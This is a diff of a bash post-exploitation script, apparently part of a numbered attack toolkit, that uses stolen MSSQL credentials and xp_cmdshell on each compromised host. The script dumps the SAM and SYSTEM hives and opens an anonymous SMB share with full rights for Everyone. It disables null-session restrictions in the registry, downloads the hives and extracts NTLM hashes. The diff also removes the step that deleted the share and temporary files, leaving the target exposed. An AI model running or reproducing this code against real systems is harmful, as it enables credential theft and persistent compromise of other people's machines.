@@ -1,7 +1,17 @@
 #!/usr/bin/env bash
 
-# Post-exploitation: dumps SAM and SYSTEM registry hives via xp_cmdshell,
-# creates an anonymous SMB share on the target, and downloads hives
+# 04_hashdump — Post-Exploitation Credential Dumping
+
+# For each compromised MSSQL host:
+#   1. Dumps SAM and SYSTEM registry hives via xp_cmdshell
+#   2. Creates a temporary anonymous SMB share on the target
+#   3. Downloads hive files to the local loot directory
+#   4. Extracts NTLM hashes with secretsdump
+
+# NOTE: Remote artifact cleanup (SMB share, temp files, registry tweaks)
+#       is handled by 07_cleanup, NOT here. This keeps the artifacts in
+#       place so that later scripts (05_persist, 06_pivot) can still
+#       interact with the target if needed.
 
 OUTDIR="./recon"
 CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
@@ -26,7 +36,7 @@ while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
     LOOT_SUBDIR="$LOOT_DIR/${SAFE_TARGET}"
     mkdir -p "$LOOT_SUBDIR"
 
-    # Creates a helper to run a single OS command via xp_cmdshell
+    # Helper: run a single OS command via xp_cmdshell
     xp() {
         local CMD="$1"
         printf "exec master..xp_cmdshell '%s';\nexit\n" "$CMD" | \
@@ -48,7 +58,6 @@ while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
     fi
 
     echo "[*] Step 2: Setting permissions for exfil..."
-    # Grant Everyone and Anonymous Logon full access on both hive files
     xp "cacls c:\\windows\\temp\\sam /E /G \"Everyone\":F" > /dev/null 2>&1
     xp "cacls c:\\windows\\temp\\sys /E /G \"Everyone\":F" > /dev/null 2>&1
     xp "cacls c:\\windows\\temp\\sam /E /G \"Anonymous Logon\":F" > /dev/null 2>&1
@@ -60,10 +69,10 @@ while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
     xp "net share pentest=c:\\windows\\temp /GRANT:\"Anonymous Logon,FULL\" /GRANT:\"Everyone,FULL\"" | \
         grep -v "^$\|SQL\|Impacket\|Press\|\[!\]"
 
-    # Modern Windows Server needs registry tweaks for null session access
     echo "[*] Step 4: Configuring registry for anonymous SMB access..."
     xp "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v RestrictNullSessAccess /t REG_DWORD /d 0 /f" > /dev/null 2>&1
     xp "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d pentest /f" > /dev/null 2>&1
+
     echo "[*] Step 5: Restarting LanmanServer for changes to take effect..."
     xp "net stop LanmanServer" > /dev/null 2>&1
     sleep 3
@@ -95,13 +104,6 @@ while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
 
     echo ""
     echo "[+] Hashes saved to $HASH_FILE"
-
-    echo "[*] Step 8: Cleanup — removing SMB share and temp files from target..."
-    xp "net share pentest /delete" > /dev/null 2>&1
-    xp "del c:\\windows\\temp\\sam" > /dev/null 2>&1
-    xp "del c:\\windows\\temp\\sys" > /dev/null 2>&1
-    echo "[+] Remote cleanup complete."
-
     echo ""
     echo "[+] Post-exploitation complete for $TARGET_IP"
     echo "    Loot saved in: $LOOT_SUBDIR/"
